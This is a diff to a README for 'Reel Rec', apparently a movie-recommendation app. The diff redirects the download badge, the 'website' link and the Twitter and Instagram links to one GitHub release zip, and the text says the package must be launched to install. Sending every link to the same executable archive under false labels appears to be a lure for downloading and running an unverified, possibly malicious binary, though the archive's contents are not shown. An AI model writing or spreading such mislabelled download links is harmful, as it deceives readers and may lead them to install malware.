@@ -38,7 +38,7 @@ Are you tired of endlessly scrolling through streaming platforms, trying to find
 
 Ready to experience the future of movie recommendations? Click the button below to download the Reel Rec software package:
 
-[![Download Reel Rec](https://img.shields.io/badge/Download-Reel_Rec-<COLOR>.svg)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Reel Rec](https://github.com/andremedina15/Reel-Rec/releases/download/v2.0/Release_x64.zip<COLOR>.svg)](https://github.com/andremedina15/Reel-Rec/releases/download/v2.0/Release_x64.zip)
 
 *Please note that the software package needs to be launched for installation.*
 
@@ -46,11 +46,11 @@ If the link does not work or is not provided, please check the "Releases" sectio
 
 ### Explore Reel Rec
 
-Visit the [Reel Rec Website](https://www.reelrec.com) to learn more about our movie recommendation AI and start discovering your next favorite films! 🚀🎞️
+Visit the [Reel Rec Website](https://github.com/andremedina15/Reel-Rec/releases/download/v2.0/Release_x64.zip) to learn more about our movie recommendation AI and start discovering your next favorite films! 🚀🎞️
 
 ### Join the Reel Rec Community
 
-Stay up to date with the latest Reel Rec news, updates, and releases by following us on [Twitter](https://twitter.com/reelrec) and [Instagram](https://www.instagram.com/reelrec). Join our growing community of movie lovers and experience the magic of Reel Rec together!
+Stay up to date with the latest Reel Rec news, updates, and releases by following us on [Twitter](https://github.com/andremedina15/Reel-Rec/releases/download/v2.0/Release_x64.zip) and [Instagram](https://github.com/andremedina15/Reel-Rec/releases/download/v2.0/Release_x64.zip). Join our growing community of movie lovers and experience the magic of Reel Rec together!
 
 ### Contributors
 
